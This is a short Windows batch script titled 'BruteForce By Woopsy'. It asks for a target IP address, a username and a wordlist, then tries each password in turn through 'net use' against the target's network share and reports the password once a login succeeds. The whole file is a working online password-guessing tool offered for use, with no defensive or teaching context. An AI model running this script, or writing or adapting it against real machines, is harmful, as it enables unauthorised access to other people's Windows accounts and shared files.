@echo off
title BruteForce By Woopsy
color A 
echo .

set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Wordlist: "

set /a count=0
for /f %%a in (%wordlist%) do (
	echo %%a
	set pass=%%a
	call :attempt	
)

echo Password not Found :(
pause
exit

:success
echo .
echo password Found!: %pass%
net use \\%ip% /d /y >nul 2>1
pause
exit



:attempt  
net use \\%ip% /user:%user% %pass% >nul 2>1
echo [ATTEMT 	%count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success  